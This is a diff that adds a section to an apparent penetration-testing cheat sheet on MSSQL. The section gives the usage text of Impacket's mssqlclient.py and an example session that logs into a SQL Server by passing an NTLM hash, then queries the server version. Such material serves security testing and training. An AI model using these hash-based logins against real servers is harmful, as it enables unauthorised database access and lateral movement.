@@ -496,6 +496,60 @@ root@LinuxVM > ./dbvis
 	|       0x0106000000000009010000005FB6DAC7F7DB546D706711B128B5063888B01770	10	Oct 09, 2017 06:55:03	Oct 09, 2017 			06:55:03	Oct 09, 2017 06:55:03	0	0	0	0	0					
 
 
+
+5. MSSQLCLIENT.py - Impacket offensive python framework
+---------------------------------------------------------
+
+Impacket - Copyright 2020 SecureAuth Corporation
+
+usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth]
+                           [-debug] [-file FILE] [-hashes LMHASH:NTHASH]
+                           [-no-pass] [-k] [-aesKey hex key]
+                           [-dc-ip ip address]
+                           target
+
+mssqlclient.py  [[domain/]username[:password]@]<targetName or address>
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -port PORT            target MSSQL port (default 1433)
+  -db DB                MSSQL database instance (default None)
+  -windows-auth         whether or not to use Windows Authentication (default False)
+  -debug                Turn DEBUG output ON
+  -file FILE            input file with commands to execute in the SQL shell
+
+authentication:
+  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
+  -no-pass              don't ask for password (useful for -k)
+  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters.
+                        If valid credentials cannot be found, it will use the ones specified in the command line
+  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
+  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
+
+
+Example with a Windows compiled version of MSSQLCLIENT.py 
+-----------------------------------------------------------
+C:\Users\Administrator.PO718687\Documents\Tools-AD\impacket_windows_binaries>mssqlclient_windows.exe -hashes aad3b435b51404eeaad3b435b51404ee:c4b1b6e2ee25d932f3bb6d232c2c6972 SQLSERVER1/Pentester@192.168.1.73 -debug -windows-auth -port 1433
+Impacket - Copyright 2020 SecureAuth Corporation
+[+] Impacket Library Installation Path: C:\Users\ADMINI~1.PO7\AppData\Local\Temp\_MEI90~1\impacket
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQLSERVER1): Line 1: Changed database context to 'master'.
+[*] INFO(SQLSERVER1): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server   (110 1256)
+[!] Press help for extra shell commands
+
+SQL> select @@version;                                                                                                                                                                            
+--------------------------------------------------------------------------------------------
+Microsoft SQL Server 2012 (SP1) - 11.0.3128.0 (X64)
+        Dec 28 2012 20:23:12
+        Copyright (c) Microsoft Corporation
+        Enterprise Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: ) (Hypervisor)
+<SNIP>
+
+
 ============================================================================================================
 07. How to identify and exploit MSSQL database and OS privileges escalation vulnerabilities
 ============================================================================================================
